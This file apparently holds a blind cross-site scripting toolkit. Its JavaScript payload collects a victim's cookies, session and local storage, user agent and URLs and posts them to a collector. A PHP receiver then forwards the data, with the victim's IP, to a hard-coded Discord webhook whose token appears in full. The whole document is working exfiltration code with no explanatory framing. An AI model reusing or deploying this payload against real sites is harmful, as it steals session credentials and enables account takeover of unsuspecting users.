var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + document.URL; 
msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' + document.cookie;
msg += '\n\nSESSION STORAGE\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL STORAGE\n' + JSON.stringify(localStorage); 
// msg += '\n\nFULL DOCUMENT\n' + document.documentElement.innerHTML;

var r = new XMLHttpRequest();
r.open('POST', mailer, true);
r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));

<?php

header("Access-Control-Allow-Origin: " . $_POST["origin"]);

$origin = $_POST["origin"];
$subject = "XSS Blind Report for " . $origin;
$ip = "Requester: " . $_SERVER["REMOTE_ADDR"] . "\nForwarded For: ". $_SERVER["HTTP_X_FORWARDED_FOR"] . "\nReferrer: ".$_SERVER["HTTP_REFERER"];
$msg = $subject . "\n\nIP ADDRESS\n" . $ip . "\n\n" . $_POST["msg"];

if ($origin && $msg) {
    $url = "https://discord.com/api/webhooks/1102690060358397974/UhPXsUvPBm36n4QfjZsgRILCisZseOkrGFaeKIYfHzFTKiUSbo_1VE2zKpQY7grpr3oz";
    $ch = curl_init($url);
    # Setup request to send json via POST.
    $payload = json_encode( array( "content"=> $msg ) );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $payload );
    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
    # Return response instead of printing.
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
    # Send request.
    $result = curl_exec($ch);
    curl_close($ch);
    # Print response.
    # echo "<pre>$result</pre>";
}
